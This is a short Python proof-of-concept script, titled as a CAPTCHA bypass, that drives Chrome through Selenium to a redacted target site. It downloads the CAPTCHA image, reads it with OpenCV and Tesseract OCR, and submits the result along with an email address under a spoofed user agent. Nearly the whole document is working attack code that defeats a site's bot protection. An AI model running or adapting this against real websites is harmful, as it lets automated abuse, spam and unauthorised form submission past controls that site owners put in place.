# POC for CAPTCHA Bypass

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import warnings
import time
import base64
import urllib.request
from PIL import Image
import pytesseract
import cv2
import os

def captcha_bypass():
    warnings.filterwarnings("ignore", category=DeprecationWarning)

    # Set up Chrome options
    options = Options()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    # Uncomment for headless execution
    # options.headless = True
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36")

    # Launch Chrome
    driver = webdriver.Chrome(options=options)

    # Visit the target site
    driver.get("https://redacted")  # Replace with actual URL

    # Wait for the page to load
    time.sleep(2)

    # Locate the CAPTCHA image and get its src attribute
    print("[*] Saving Captcha Image")
    img = driver.find_element(By.XPATH, '/html/body/form/div[2]/div/div/div[5]/div[1]/div[1]/div/img')
    src = img.get_attribute('src')

    # Download the CAPTCHA image
    urllib.request.urlretrieve(src, "captcha.png")

    print("[*] Converting Captcha image into text...")

    # Load and process image using OpenCV
    image = cv2.imread("captcha.png")
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

    # Save the processed image temporarily
    filename = f"{os.getpid()}.png"
    cv2.imwrite(filename, gray)

    # Use pytesseract to perform OCR on the image
    text = pytesseract.image_to_string(Image.open(filename)).strip()
    os.remove(filename)

    print("Captcha Text is:", text)

    print("[*] Submitting the form...")

    # Fill in the form
    driver.find_element(By.ID, "txt_SubmitCaptchaInput").send_keys(text)
    driver.find_element(By.ID, "emailAddress").send_keys("user@test.com")
    driver.find_element(By.ID, "validateBtn").click()

    print("\n\t\t~ CAPTCHA BYPASS ATTEMPT COMPLETE ~")

    # Wait for response or redirection
    for _ in range(3):
        time.sleep(4)

# Run the function
captcha_bypass()
